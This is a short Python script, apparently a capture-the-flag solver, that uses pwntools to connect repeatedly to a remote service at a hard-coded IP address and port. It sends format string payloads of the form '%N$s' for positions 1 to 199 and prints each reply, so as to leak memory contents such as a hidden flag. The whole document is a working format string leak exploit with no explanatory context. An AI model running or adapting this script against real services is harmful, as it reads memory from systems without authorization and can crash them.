#!/usr/bin/env python

from pwn import *


for i in range(1,200):
    p = remote("139.59.0.163",7777)
    x = f'%{i}$s'
    p.recvline()
    p.sendline(bytes(x,"UTF-8"))
    print(p.recvline())

